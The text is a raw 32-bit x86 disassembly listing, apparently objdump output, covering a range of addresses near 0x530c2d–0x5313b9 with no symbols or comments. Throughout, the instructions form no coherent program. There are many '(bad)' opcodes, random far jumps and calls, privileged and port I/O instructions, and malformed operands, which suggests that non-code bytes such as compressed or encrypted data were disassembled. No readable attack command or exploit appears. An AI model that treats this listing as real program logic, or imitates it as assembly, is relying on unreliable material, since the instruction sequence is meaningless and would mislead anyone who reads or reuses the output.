  530c2d:	mov    cl,0x8f
  530c2f:	cmp    al,0x12
  530c31:	dec    ebx
  530c32:	dec    esp
  530c33:	inc    eax
  530c34:	ins    DWORD PTR es:[edi],dx
  530c35:	iret   
  530c36:	add    ch,ch
  530c38:	pop    ebp
  530c39:	xor    eax,0x25b796e3
  530c3e:	sti    
  530c3f:	push   cs
  530c40:	xor    al,0x5f
  530c42:	cwde   
  530c43:	xchg   BYTE PTR [eax-0x28a98f4f],bh
  530c49:	stos   DWORD PTR es:[edi],eax
  530c4a:	lock jmp 0x3d1f:0x34a34c8e
  530c52:	imul   ebp,DWORD PTR [edi+ebp*8+0x60],0x82c84956
  530c5a:	fist   WORD PTR [edi+0x67]
  530c5d:	adc    DWORD PTR [esi+0xf],edx
  530c60:	inc    ebx
  530c61:	cs (bad) 
  530c63:	fldenv [edx+0x9fa1b7a]
  530c69:	pop    edx
  530c6a:	add    ecx,DWORD PTR [ebx+0x3e]
  530c6d:	stos   DWORD PTR es:[edi],eax
  530c6e:	sti    
  530c6f:	(bad)  [edx+edi*8+0x7244cc8d]
  530c76:	sbb    BYTE PTR [edi],ah
  530c78:	cmp    DWORD PTR [edi-0x5c],ebx
  530c7b:	jmp    0xe54e:0x27d6889d
  530c82:	mov    dl,0xfc
  530c84:	call   ebx
  530c86:	aas    
  530c87:	mov    bh,0x1c
  530c89:	jae    0x530c0b
  530c8b:	add    al,0xd3
  530c8d:	es xchg ebx,eax
  530c8f:	aaa    
  530c90:	push   esp
  530c91:	jecxz  0x530cfc
  530c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530c94:	(bad)  
  530c95:	cmp    al,al
  530c97:	in     al,dx
  530c98:	sub    DWORD PTR [ebx],edx
  530c9a:	es jmp 0xae7:0x76f82f69
  530ca2:	lds    ebp,FWORD PTR [edi+ecx*2+0x2959a678]
  530ca9:	cmp    edi,edi
  530cab:	inc    bl
  530cad:	dec    ebp
  530cae:	xor    DWORD PTR [ecx-0x2e1334ca],ecx
  530cb4:	int    0xb2
  530cb6:	icebp  
  530cb7:	add    DWORD PTR [ebp-0x3836d762],esp
  530cbd:	dec    edi
  530cbe:	out    dx,al
  530cbf:	xchg   BYTE PTR [ebx],al
  530cc1:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  530cc3:	ins    BYTE PTR es:[edi],dx
  530cc4:	jmp    0x5868ce64
  530cc9:	cli    
  530cca:	setae  BYTE PTR [eax+0x4a81f0e0]
  530cd1:	imul   esi,DWORD PTR ds:0x7199d9ff,0x7b
  530cd8:	sar    BYTE PTR [edi],1
  530cda:	inc    eax
  530cdb:	xchg   ebx,eax
  530cdc:	test   al,0xe8
  530cde:	cmc    
  530cdf:	adc    esp,DWORD PTR [eax]
  530ce1:	inc    edx
  530ce2:	fistp  QWORD PTR [esp+ebp*4-0x6a]
  530ce6:	dec    esp
  530ce7:	mov    ebx,0xd1059a01
  530cec:	dec    esp
  530ced:	jl     0x530d2e
  530cef:	xor    eax,0x718bde94
  530cf4:	xor    al,BYTE PTR [ecx]
  530cf6:	cmp    DWORD PTR [edi+0x3d],edx
  530cf9:	jp     0x530c9b
  530cfb:	sbb    BYTE PTR [edi],0x74
  530cfe:	js     0x530cde
  530d00:	dec    ecx
  530d01:	xchg   esi,eax
  530d02:	dec    esp
  530d03:	push   edx
  530d04:	ret    0x7be8
  530d07:	ja     0x530d2b
  530d09:	cmp    al,0xd0
  530d0b:	test   DWORD PTR [ecx],0x169b0b03
  530d11:	fst    DWORD PTR [edx+0x20]
  530d14:	je     0x530cde
  530d16:	mov    ebx,0x772cd9ee
  530d1b:	mov    ah,0x9
  530d1d:	cmp    ecx,DWORD PTR [ebx+0x7d16a1c8]
  530d23:	dec    esp
  530d24:	lea    ecx,[edx+0x70]
  530d27:	repz cmp edi,DWORD PTR [edx+ecx*1+0x53]
  530d2c:	ss nop
  530d2e:	sbb    eax,ecx
  530d30:	sub    al,0xce
  530d32:	or     eax,0x316b4450
  530d37:	xor    bh,dh
  530d39:	sbb    eax,0xf5f629e8
  530d3e:	std    
  530d3f:	(bad)  [ebp+0x58]
  530d42:	pop    ss
  530d43:	pop    esp
  530d44:	lds    ebp,FWORD PTR [edx+ebx*4-0x42]
  530d48:	or     ebx,DWORD PTR [ebp+0x52]
  530d4b:	imul   ebp,DWORD PTR [edx+0x40],0x1fa012e5
  530d52:	lea    ebp,[esi]
  530d54:	adc    eax,DWORD PTR [eax-0x21]
  530d57:	mov    eax,DWORD PTR [eax-0x24]
  530d5a:	push   cs
  530d5b:	xchg   esp,eax
  530d5c:	jmp    0xacd6:0xcd932ae3
  530d63:	mov    dl,0xdd
  530d65:	and    eax,0x485dc5e6
  530d6a:	mov    ecx,0x7498b4c6
  530d6f:	scas   eax,DWORD PTR es:[edi]
  530d70:	xchg   esp,eax
  530d71:	into   
  530d72:	jbe    0x530d08
  530d74:	xor    ecx,DWORD PTR [ebp+0x3e934f3f]
  530d7a:	retf   0x3a9a
  530d7d:	mov    WORD PTR [esi-0x3f],fs
  530d80:	cwde   
  530d81:	lods   al,BYTE PTR ds:[esi]
  530d82:	mov    ah,0xb2
  530d84:	enter  0xe073,0xb2
  530d88:	ins    DWORD PTR es:[edi],dx
  530d89:	push   ds
  530d8a:	inc    edx
  530d8b:	mov    WORD PTR [ebx-0x48a3b031],fs
  530d91:	stos   BYTE PTR es:[edi],al
  530d92:	ja     0x530dc8
  530d94:	test   BYTE PTR [ebp-0x54],dh
  530d97:	pop    edx
  530d98:	sub    esp,esp
  530d9a:	xor    al,0x7d
  530d9c:	sub    DWORD PTR [esi+0x20e8a5e1],ecx
  530da2:	int3   
  530da3:	mov    cl,0xca
  530da5:	fwait
  530da6:	jg     0x530d53
  530da8:	sub    eax,0xd3fe7f69
  530dad:	jne    0x530d48
  530daf:	sub    DWORD PTR ds:0x9ed2d7e3,eax
  530db5:	xor    al,0xcf
  530db7:	mov    BYTE PTR [ebx],dh
  530db9:	pop    esi
  530dba:	bound  esi,QWORD PTR [edx]
  530dbc:	dec    BYTE PTR [eax+0x49906218]
  530dc2:	mov    ah,ch
  530dc4:	jno    0x530ddd
  530dc6:	test   al,0x3f
  530dc8:	add    DWORD PTR [eax+0x65],0x2c
  530dcc:	movbe  DWORD PTR [edx],ecx
  530dd0:	cmp    BYTE PTR [edi],bh
  530dd2:	sbb    eax,esp
  530dd4:	bound  eax,QWORD PTR [esi-0x6f]
  530dd7:	ror    bh,0xb7
  530dda:	xor    eax,ecx
  530ddc:	ins    BYTE PTR es:[edi],dx
  530ddd:	hlt    
  530dde:	daa    
  530ddf:	xor    ecx,DWORD PTR [ebp-0x343cedf5]
  530de5:	popf   
  530de6:	les    ecx,FWORD PTR [ecx+0x22]
  530de9:	add    DWORD PTR [eax],ebp
  530deb:	mov    al,0x1
  530ded:	fisttp DWORD PTR [eax+eax*2]
  530df0:	or     BYTE PTR [ebx-0x37],0x9b
  530df4:	popf   
  530df5:	mov    esp,0xf3ba1944
  530dfa:	ins    BYTE PTR es:[edi],dx
  530dfb:	pop    ebp
  530dfc:	inc    edi
  530dfd:	sbb    eax,DWORD PTR [edi+ebx*8+0x31]
  530e01:	inc    ebp
  530e02:	mov    ecx,0xea787d2c
  530e07:	or     eax,0x45686f12
  530e0c:	out    dx,eax
  530e0d:	inc    eax
  530e0e:	repz jno 0x530e3e
  530e11:	retf   
  530e12:	or     al,0xb2
  530e14:	jne    0x530dea
  530e16:	mov    esp,0xfaa0822b
  530e1b:	mov    BYTE PTR ds:0x45b1fee6,dh
  530e21:	dec    ecx
  530e22:	and    dl,BYTE PTR [ebp-0x3a]
  530e25:	mul    ecx
  530e27:	add    eax,DWORD PTR gs:0xf551eefa
  530e2e:	xchg   esi,eax
  530e2f:	mov    dl,0x61
  530e31:	mov    eax,ds:0x65fd4831
  530e36:	inc    ecx
  530e37:	add    edx,DWORD PTR [edx]
  530e39:	push   cs
  530e3a:	or     ebp,ebx
  530e3c:	call   0x9447:0x6b510bb
  530e43:	jno    0x530e55
  530e45:	and    al,0xb7
  530e47:	aas    
  530e48:	mov    edi,0xf56d6598
  530e4d:	push   esi
  530e4e:	arpl   WORD PTR [ebp+edi*8+0x5d7f9eca],bp
  530e55:	sbb    al,0xb4
  530e57:	shr    edx,1
  530e59:	adc    DWORD PTR [ebp+0x4d7b60a2],0xa05807ee
  530e63:	sbb    ecx,0x9798f77
  530e69:	and    BYTE PTR [ecx],ch
  530e6b:	push   es
  530e6c:	std    
  530e6d:	cli    
  530e6e:	popa   
  530e6f:	jns    0x530ebf
  530e71:	push   edx
  530e72:	mov    ebp,0xd2c6308
  530e77:	inc    eax
  530e78:	mov    ch,0x7
  530e7a:	pusha  
  530e7b:	xor    al,0x3c
  530e7d:	mov    ebx,0xebce574d
  530e82:	or     al,0x6a
  530e84:	into   
  530e85:	retf   
  530e86:	popf   
  530e87:	ja     0x530f00
  530e89:	and    al,0xc6
  530e8b:	jb     0x530e44
  530e8d:	dec    ebx
  530e8e:	(bad)
  530e92:	and    bl,BYTE PTR [edi+0x54]
  530e95:	push   esp
  530e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  530e97:	push   ss
  530e98:	xor    eax,0xad075f93
  530e9d:	bound  eax,QWORD PTR [eax-0x10]
  530ea0:	xor    BYTE PTR [esi-0x3c],al
  530ea3:	(bad)  
  530ea4:	iret   
  530ea5:	mov    dh,0x37
  530ea7:	jnp    0x530eb6
  530ea9:	push   esi
  530eaa:	(bad)  
  530eab:	cmp    al,0xc0
  530ead:	mov    ecx,0x64bfd9d
  530eb2:	inc    edx
  530eb3:	add    ecx,esi
  530eb5:	aaa    
  530eb6:	cmp    eax,0x1cf1ba75
  530ebb:	div    BYTE PTR [ebx+edi*2-0x5e]
  530ebf:	push   esp
  530ec0:	mov    WORD PTR [edi+0x596a6556],gs
  530ec6:	pop    ebp
  530ec7:	xor    ebp,DWORD PTR [eax+0x20]
  530eca:	(bad)  
  530ecb:	push   edx
  530ecc:	daa    
  530ecd:	stos   BYTE PTR es:[edi],al
  530ece:	mov    eax,ds:0xd063cd03
  530ed3:	or     eax,0xf9d76e6a
  530ed8:	call   DWORD PTR [edx-0x4d]
  530edb:	out    dx,eax
  530edc:	xor    bl,BYTE PTR [edi+0x469229e6]
  530ee2:	mov    ?,WORD PTR [eax-0x46]
  530ee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  530ee6:	int3   
  530ee7:	cli    
  530ee8:	(bad)  
  530ee9:	and    eax,0xf47d4678
  530eee:	hlt    
  530eef:	inc    eax
  530ef0:	scas   al,BYTE PTR es:[edi]
  530ef1:	(bad)  
  530ef2:	mov    esp,DWORD PTR [eax]
  530ef4:	(bad)  
  530ef5:	imul   edx,edi,0xb0a1d03d
  530efb:	jo     0x530f50
  530efd:	sbb    al,0x5b
  530eff:	je     0x530f5d
  530f01:	mov    dl,0x53
  530f03:	dec    ebp
  530f04:	iret   
  530f05:	or     al,0x36
  530f07:	push   ebx
  530f08:	inc    edi
  530f09:	mov    edi,0xd2e67357
  530f0e:	(bad)  
  530f0f:	ins    DWORD PTR es:[edi],dx
  530f10:	int    0x5d
  530f12:	outs   dx,BYTE PTR ds:[esi]
  530f13:	or     edi,ebx
  530f15:	xchg   esi,eax
  530f16:	pop    ebx
  530f17:	les    ecx,FWORD PTR [esp+ebp*1]
  530f1a:	dec    edx
  530f1b:	call   0xe396:0xf28359ec
  530f22:	push   esp
  530f23:	imul   ebx,DWORD PTR [edx],0x23
  530f26:	jb     0x530f56
  530f28:	pop    ds
  530f29:	into   
  530f2a:	mov    edi,0xf976641f
  530f2f:	cmp    esi,eax
  530f31:	(bad)  
  530f32:	scas   eax,DWORD PTR es:[edi]
  530f33:	lods   al,BYTE PTR ds:[esi]
  530f34:	push   eax
  530f35:	xchg   esp,eax
  530f36:	sub    ecx,esp
  530f38:	adc    ch,BYTE PTR [ebx+0x442e2931]
  530f3e:	stos   DWORD PTR es:[edi],eax
  530f3f:	mov    BYTE PTR [esp+edx*2-0x3e342e63],ah
  530f46:	ss dec edx
  530f48:	nop
  530f49:	xor    eax,0xef76d5da
  530f4e:	mov    eax,ds
  530f50:	scas   al,BYTE PTR es:[edi]
  530f51:	(bad)  
  530f52:	add    BYTE PTR [eax],al
  530f54:	in     eax,dx
  530f55:	arpl   WORD PTR [edx+0x45ce42ba],cx
  530f5b:	dec    eax
  530f5c:	ror    DWORD PTR [esi-0x2a710e4b],cl
  530f62:	mov    dl,BYTE PTR [esi+esi*8]
  530f65:	fs js  0x530fd1
  530f68:	ja     0x530f5b
  530f6a:	pop    ds
  530f6b:	scas   al,BYTE PTR es:[edi]
  530f6c:	xor    BYTE PTR [eax-0x5f6898b],dl
  530f72:	fdivr  QWORD PTR [esi-0x1127b7db]
  530f78:	nop
  530f79:	scas   al,BYTE PTR es:[edi]
  530f7a:	and    BYTE PTR [edi+0x39affe51],dl
  530f80:	jg     0x530fd1
  530f82:	jne    0x530f19
  530f84:	in     eax,0xf0
  530f86:	clc    
  530f87:	sbb    BYTE PTR [ecx-0x4b1a5e1a],al
  530f8d:	inc    ebx
  530f8e:	or     eax,0x95959cc8
  530f93:	sbb    DWORD PTR [edi-0x14],ebp
  530f96:	ins    DWORD PTR es:[edi],dx
  530f97:	dec    ebp
  530f98:	mov    al,0xc
  530f9a:	add    ecx,DWORD PTR [eax+0x6d45e950]
  530fa0:	xchg   ebx,eax
  530fa1:	mov    WORD PTR [ebx-0x45],gs
  530fa4:	mov    esi,0x930de146
  530fa9:	xchg   dl,bl
  530fab:	inc    eax
  530fac:	aaa    
  530fad:	dec    esp
  530fae:	dec    eax
  530faf:	mov    ds:0xabc44bfc,eax
  530fb4:	leave  
  530fb5:	test   al,dl
  530fb7:	sub    ebx,eax
  530fb9:	mov    ds:0xd90cadc,al
  530fbe:	xor    ecx,DWORD PTR [eax]
  530fc0:	lock outs dx,BYTE PTR ds:[esi]
  530fc2:	inc    edx
  530fc3:	xor    eax,esp
  530fc5:	xlat   BYTE PTR ds:[ebx]
  530fc6:	out    dx,eax
  530fc7:	xchg   edx,eax
  530fc8:	or     dh,al
  530fca:	push   esi
  530fcb:	ins    BYTE PTR es:[edi],dx
  530fcc:	adc    BYTE PTR [ebx],al
  530fce:	ins    DWORD PTR es:[edi],dx
  530fcf:	loope  0x530fc3
  530fd1:	pop    ebp
  530fd2:	cmp    eax,0xd6b7d858
  530fd7:	pop    ebx
  530fd8:	cwde   
  530fd9:	js     0x530fd4
  530fdb:	rcl    dl,cl
  530fdd:	add    BYTE PTR [edx-0x5d],ah
  530fe0:	adc    dl,BYTE PTR [ebx-0x6]
  530fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  530fe4:	ja     0x530f7e
  530fe6:	jg     0x53103a
  530fe8:	xchg   esi,eax
  530fe9:	pop    edx
  530fea:	fiadd  DWORD PTR [esi-0x2ba05f1e]
  530ff0:	(bad)  
  530ff1:	push   ebp
  530ff2:	xchg   ecx,eax
  530ff3:	pusha  
  530ff4:	sub    eax,0x134ae168
  530ff9:	cmp    edx,DWORD PTR [ebx-0x4552508]
  530fff:	out    dx,al
  531000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  531001:	jge    0x530ff6
  531003:	(bad)  
  531004:	pushf  
  531005:	rcl    DWORD PTR [eax+0x4d],cl
  531008:	and    edi,DWORD PTR [ecx-0x55]
  53100b:	lods   eax,DWORD PTR ds:[esi]
  53100c:	es xchg edi,eax
  53100e:	in     eax,dx
  53100f:	call   0x1108f3ad
  531014:	jle    0x531090
  531016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531017:	les    edi,FWORD PTR [esi+ecx*2]
  53101a:	or     dh,ah
  53101c:	fisubr DWORD PTR [edx]
  53101e:	mov    ds:0x98c7c374,al
  531023:	aaa    
  531024:	ror    BYTE PTR [ebp-0x646c63d7],0x27
  53102b:	lds    esp,FWORD PTR [ebx+ecx*8-0x178aa0f3]
  531032:	dec    si
  531034:	push   esp
  531035:	jb     0x531008
  531037:	ins    DWORD PTR es:[edi],dx
  531038:	test   DWORD PTR [esi-0x76bbffd0],esi
  53103e:	cmp    eax,esi
  531040:	sbb    al,0x28
  531042:	fadd   DWORD PTR [ebx-0x37]
  531045:	pusha  
  531046:	jns    0x53109e
  531048:	shr    DWORD PTR [edx],0xeb
  53104b:	(bad)  
  53104c:	aam    0x78
  53104e:	and    ecx,DWORD PTR [edx+ebx*8-0x51]
  531052:	push   es
  531053:	(bad)  
  531054:	or     eax,0x6d945602
  531059:	das    
  53105a:	js     0x53104c
  53105c:	and    bl,BYTE PTR [eax]
  53105e:	ins    BYTE PTR es:[edi],dx
  53105f:	cdq    
  531060:	scas   eax,DWORD PTR es:[edi]
  531061:	or     eax,DWORD PTR [edi+eax*1-0x50]
  531065:	call   edx
  531067:	popa   
  531068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  531069:	js     0x5310cc
  53106b:	xchg   esi,eax
  53106c:	add    al,0x3
  53106e:	mov    ds:0xbb3ca4d8,al
  531073:	retf   
  531074:	sub    bl,dh
  531076:	adc    al,0xf9
  531078:	xlat   BYTE PTR ds:[ebx]
  531079:	or     edi,DWORD PTR [ebx]
  53107b:	mov    bh,0x2
  53107d:	jge    0x5310dc
  53107f:	dec    edx
  531080:	in     al,0xba
  531082:	push   ds
  531083:	mov    ds:0x165cb93d,eax
  531088:	jae    0x5310a3
  53108a:	inc    esp
  53108b:	inc    edx
  53108c:	shr    DWORD PTR [edx-0x145d1f89],1
  531092:	and    al,0x7f
  531094:	cwde   
  531095:	or     eax,0x5c4b3151
  53109a:	ja     0x53102e
  53109c:	inc    esi
  53109d:	pop    ebx
  53109e:	adc    DWORD PTR [edi-0x160a97c9],eax
  5310a4:	xlat   BYTE PTR ds:[ebx]
  5310a5:	(bad)  
  5310a6:	jne    0x53107c
  5310a8:	xor    ebp,ebx
  5310aa:	add    eax,0x86353a8
  5310af:	mov    esi,0x5d7804b7
  5310b4:	rcl    DWORD PTR [ecx-0x65712015],1
  5310ba:	(bad)  [edx-0x8]
  5310bd:	popf   
  5310be:	add    al,0x4c
  5310c0:	push   ds
  5310c1:	and    eax,0xab5412b2
  5310c6:	mov    ah,0x0
  5310c8:	lock test al,0x62
  5310cb:	fistp  DWORD PTR [edi]
  5310cd:	clc    
  5310ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5310cf:	pop    edx
  5310d0:	(bad)  
  5310d1:	jae    0x5310f0
  5310d3:	enter  0xfdf7,0x75
  5310d7:	fld    DWORD PTR [edx+0x61]
  5310da:	sub    DWORD PTR [edx-0x14c08307],ebx
  5310e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5310e1:	data16 or cl,bh
  5310e4:	iret   
  5310e5:	call   0x709d:0x3d385778
  5310ec:	ret    0x195c
  5310ef:	sub    ebx,eax
  5310f1:	jae    0x531074
  5310f3:	in     al,0xac
  5310f5:	push   ecx
  5310f6:	arpl   WORD PTR [ebx],dx
  5310f8:	sbb    bl,dh
  5310fa:	pop    esp
  5310fb:	jae    0x53109e
  5310fd:	sbb    al,0xac
  5310ff:	out    dx,al
  531100:	pushf  
  531101:	cld    
  531102:	mov    ebx,0x1288ac81
  531107:	cmp    al,0x19
  531109:	or     dl,dh
  53110b:	dec    eax
  53110c:	lahf   
  53110d:	inc    ebx
  53110e:	pop    eax
  53110f:	sbb    BYTE PTR [ecx+0x15],0x39
  531113:	sub    ecx,ebx
  531115:	inc    ecx
  531116:	mov    dh,0xb5
  531118:	dec    edx
  531119:	setle  BYTE PTR [esi+0x709de489]
  531120:	cmc    
  531121:	icebp  
  531122:	loope  0x531197
  531124:	mov    eax,ds:0x66e0679d
  531129:	xchg   esi,eax
  53112a:	dec    ebx
  53112b:	(bad)  
  53112c:	in     al,dx
  53112d:	jnp    0x53115a
  53112f:	(bad)  
  531130:	icebp  
  531131:	aad    0x73
  531133:	cmp    DWORD PTR [ebp+edi*8+0x5dc3a78c],esp
  53113a:	mov    ds:0xe1044ef3,eax
  53113f:	test   BYTE PTR [edi],ch
  531141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  531142:	cmp    BYTE PTR [ebx+0x4a],0x3b
  531146:	outs   dx,DWORD PTR ds:[esi]
  531147:	jmp    0x2293:0xe78c07bb
  53114e:	ins    DWORD PTR es:[edi],dx
  53114f:	test   eax,0xf24e0140
  531154:	jg     0x53111c
  531156:	inc    esp
  531157:	push   ecx
  531158:	mov    dl,0x94
  53115a:	mov    eax,0x866582bc
  53115f:	int3   
  531160:	fld    st(1)
  531162:	sbb    ah,BYTE PTR [edx]
  531164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  531165:	call   0xc612cdfd
  53116a:	sub    bh,BYTE PTR [eax+0x782926bc]
  531170:	mov    edi,0xfa842d13
  531175:	cld    
  531176:	mov    edx,0xfb2dc92a
  53117b:	popf   
  53117c:	add    dl,ch
  53117e:	jp     0x531182
  531180:	mov    bl,0xdd
  531182:	sbb    al,BYTE PTR [eax]
  531184:	jae    0x5311f3
  531186:	arpl   WORD PTR [edi],ax
  531188:	dec    edx
  531189:	test   dl,ah
  53118b:	shr    DWORD PTR [esi-0x6d],cl
  53118e:	or     esp,edi
  531190:	stc    
  531191:	adc    DWORD PTR [ecx],ecx
  531193:	jg     0x531151
  531195:	aaa    
  531196:	ss push ecx
  531198:	mov    edi,ds
  53119a:	jge    0x531123
  53119c:	push   edx
  53119d:	int3   
  53119e:	push   esi
  53119f:	aaa    
  5311a0:	sub    eax,0xb1621cf4
  5311a5:	mov    ch,0xc4
  5311a7:	stos   BYTE PTR es:[edi],al
  5311a8:	mov    ch,0x1
  5311aa:	jmp    0x5311e4
  5311ac:	inc    eax
  5311ad:	and    eax,0xa02147c8
  5311b2:	jle    0x531139
  5311b4:	icebp  
  5311b5:	bnd ret 
  5311b7:	pop    es
  5311b8:	pop    eax
  5311b9:	fcom   st(0)
  5311bb:	push   es
  5311bc:	add    BYTE PTR [esi+0x4e],al
  5311bf:	and    eax,0x42590e2f
  5311c4:	mov    ch,0x24
  5311c6:	mov    al,0xff
  5311c8:	fimul  DWORD PTR [eax]
  5311ca:	outs   dx,DWORD PTR ds:[esi]
  5311cb:	jns    0x5311f4
  5311cd:	pop    esi
  5311ce:	pop    esi
  5311cf:	(bad)  
  5311d0:	sub    al,0x4a
  5311d2:	dec    edx
  5311d3:	ficom  WORD PTR [esi-0x68]
  5311d6:	jecxz  0x531186
  5311d8:	(bad)  
  5311da:	fld    QWORD PTR [edi+0x2af83bde]
  5311e0:	test   al,0x81
  5311e2:	add    eax,0x9ab0dd77
  5311e7:	fcomp  QWORD PTR [ebx+0x0]
  5311ea:	std    
  5311eb:	loopne 0x53118d
  5311ed:	rcl    ch,cl
  5311ef:	mov    eax,ds:0x32c60575
  5311f4:	mov    DWORD PTR [edi+0x5d],edx
  5311f7:	icebp  
  5311f8:	leave  
  5311f9:	and    DWORD PTR [ecx],edi
  5311fb:	shl    dl,cl
  5311fd:	pop    ds
  5311fe:	or     BYTE PTR [eax+0x4fe42bbc],al
  531204:	pop    ss
  531205:	xor    eax,0xd579ac86
  53120a:	pop    es
  53120b:	lds    ebx,FWORD PTR [eax]
  53120d:	cwde   
  53120e:	or     dh,al
  531210:	(bad)  
  531211:	outs   dx,BYTE PTR ds:[esi]
  531212:	and    esp,DWORD PTR [ecx+0x24]
  531215:	inc    esp
  531216:	cmp    eax,0x12a67d1a
  53121b:	and    BYTE PTR [ebp-0x77],bl
  53121e:	add    eax,0xb2acc2e9
  531223:	call   0xefb59aab
  531228:	cmp    DWORD PTR [edi-0x56f37b25],ebp
  53122e:	push   0xcd024c3
  531233:	adc    cl,BYTE PTR [eax-0x71683fae]
  531239:	(bad)  
  53123a:	cmp    BYTE PTR [eax],al
  53123c:	les    esp,FWORD PTR es:[esi-0x741483ae]
  531243:	iret   
  531244:	in     al,0x6b
  531246:	mov    DWORD PTR [edi+edi*2],edx
  531249:	pop    ss
  53124a:	outs   dx,DWORD PTR ds:[esi]
  53124b:	jmp    edi
  53124d:	gs jmp 0x53126a
  531250:	sub    al,0xdb
  531252:	pop    ss
  531253:	out    dx,eax
  531254:	cwde   
  531255:	xor    edi,esi
  531257:	shl    BYTE PTR [edx-0x41f2461a],0x67
  53125e:	(bad)  
  53125f:	stc    
  531260:	xchg   BYTE PTR [ebp+0x2c],al
  531263:	mov    esi,0x8ef55217
  531268:	pop    esi
  531269:	ins    DWORD PTR es:[edi],dx
  53126a:	test   al,0xba
  53126c:	aaa    
  53126d:	test   BYTE PTR [edx+eax*1-0x18],0xc8
  531272:	jmp    0x807db7a5
  531277:	sub    ebx,DWORD PTR [eax]
  531279:	fcom   DWORD PTR [ebp-0x1a]
  53127c:	cwde   
  53127d:	js     0x5312ba
  53127f:	sbb    esi,DWORD PTR [ebx+0x3d]
  531282:	lods   al,BYTE PTR ds:[esi]
  531283:	mov    al,ds:0xcf202558
  531288:	(bad)  
  531289:	jge    0x53121f
  53128b:	addr16 push edi
  53128d:	rcl    DWORD PTR [ecx+0x4a6c4d4],0xb8
  531294:	test   dh,bh
  531296:	sbb    DWORD PTR [eax-0x1cc920a6],esi
  53129c:	add    al,0xf3
  53129e:	mov    al,ds:0x348994e0
  5312a3:	dec    eax
  5312a4:	mov    bh,0x9e
  5312a6:	fld    TBYTE PTR [esi]
  5312a8:	test   al,0xd3
  5312aa:	cmp    esp,DWORD PTR [edx]
  5312ac:	cmc    
  5312ad:	loope  0x5312ad
  5312af:	or     ebx,esi
  5312b1:	daa    
  5312b2:	stos   BYTE PTR es:[edi],al
  5312b3:	or     DWORD PTR [esi-0x1e13e0c1],esp
  5312b9:	jp     0x5312e8
  5312bb:	dec    esp
  5312bc:	pop    esi
  5312bd:	cmc    
  5312be:	fnstsw WORD PTR ds:0x4120b2c7
  5312c4:	ins    DWORD PTR es:[edi],dx
  5312c5:	push   ds
  5312c6:	jl     0x5312d7
  5312c8:	jb     0x5312f3
  5312ca:	sbb    DWORD PTR [edx+0x1717b623],ebx
  5312d0:	fldcw  WORD PTR ds:0xcdfb5bef
  5312d6:	aam    0xa1
  5312d8:	ins    DWORD PTR es:[edi],dx
  5312d9:	sbb    al,0xcd
  5312db:	xchg   ecx,eax
  5312dc:	test   ebx,esp
  5312de:	test   eax,edi
  5312e0:	lock push ecx
  5312e2:	pusha  
  5312e3:	xchg   esp,eax
  5312e4:	xor    BYTE PTR [esi+0x6c],bh
  5312e7:	jnp    0x5312f0
  5312e9:	sub    DWORD PTR [eax+0x71],edi
  5312ec:	fld    DWORD PTR [eax]
  5312ee:	sub    BYTE PTR [edx+0x2e2f4b48],bl
  5312f4:	test   BYTE PTR [esi+esi*4],dl
  5312f7:	mov    ?,WORD PTR [ecx-0x5d]
  5312fa:	arpl   WORD PTR [edi+0x2a76950c],dx
  531300:	and    edx,DWORD PTR [ecx+0x52]
  531303:	cmp    eax,0xa7ad4381
  531308:	sbb    ecx,edi
  53130a:	mov    DWORD PTR ds:0x61dc40d2,esi
  531310:	stc    
  531311:	or     ebp,DWORD PTR [ecx]
  531313:	(bad)  
  531315:	es repz js 0x5312e4
  531319:	out    0x83,eax
  53131b:	(bad)  [esi-0x58]
  53131e:	and    al,0x1e
  531320:	fst    QWORD PTR [edx-0x30]
  531323:	or     al,0x92
  531325:	jnp    0x531351
  531327:	and    edi,DWORD PTR [ebx+0x13]
  53132a:	push   0xf
  53132c:	add    DWORD PTR [esp+eiz*4+0x58],0xdbea1490
  531334:	xor    eax,0x555267ab
  531339:	add    eax,0x410b271a
  53133e:	jl     0x53130a
  531340:	fimul  WORD PTR [ecx-0x32655b62]
  531346:	jmp    0x531364
  531348:	pushf  
  531349:	cmp    ebp,ecx
  53134b:	aam    0xb0
  53134d:	mov    ch,0x67
  53134f:	push   ds
  531350:	out    0x4a,eax
  531352:	push   ebp
  531353:	xchg   ebp,eax
  531354:	inc    ebp
  531355:	push   0xffffffe9
  531357:	out    dx,eax
  531358:	push   cs
  531359:	int3   
  53135a:	es aaa 
  53135c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53135d:	sub    BYTE PTR [esp+edi*8],cl
  531360:	sub    al,BYTE PTR [ecx]
  531362:	adc    DWORD PTR [edx-0x19],ebp
  531365:	mov    eax,0xddfd584b
  53136a:	loope  0x5312f2
  53136c:	stos   DWORD PTR es:[edi],eax
  53136d:	sbb    bl,BYTE PTR ds:0x8276d598
  531373:	jo     0x53135d
  531375:	jbe    0x531321
  531377:	xchg   DWORD PTR [ebx-0x4d8bdce0],eax
  53137d:	call   0xd9e3288c
  531382:	adc    al,BYTE PTR [ebx+0x6fbc9948]
  531388:	jne    0x531389
  53138a:	pop    ecx
  53138b:	push   edx
  53138c:	mov    dh,0xc5
  53138e:	pop    ebp
  53138f:	js     0x53138b
  531391:	ror    eax,1
  531393:	fist   WORD PTR [eax+edx*2]
  531396:	(bad)  
  531398:	mov    edx,0xc426f221
  53139d:	lods   eax,DWORD PTR ds:[esi]
  53139e:	ret    0xd51
  5313a1:	cmc    
  5313a2:	jg     0x531383
  5313a4:	inc    esp
  5313a5:	lods   al,BYTE PTR ds:[esi]
  5313a6:	cmp    cl,BYTE PTR [ebx]
  5313a8:	stos   BYTE PTR es:[edi],al
  5313a9:	push   ebp
  5313aa:	imul   BYTE PTR [eax+0x0]
  5313ad:	stos   BYTE PTR es:[edi],al
  5313ae:	nop
  5313af:	lds    ebx,FWORD PTR [edx-0x16]
  5313b2:	leave  
  5313b3:	xchg   DWORD PTR [ebx-0x5d50498f],edi
  5313b9:	sub    BYTE PTR [ecx-0x2983e83f],cl
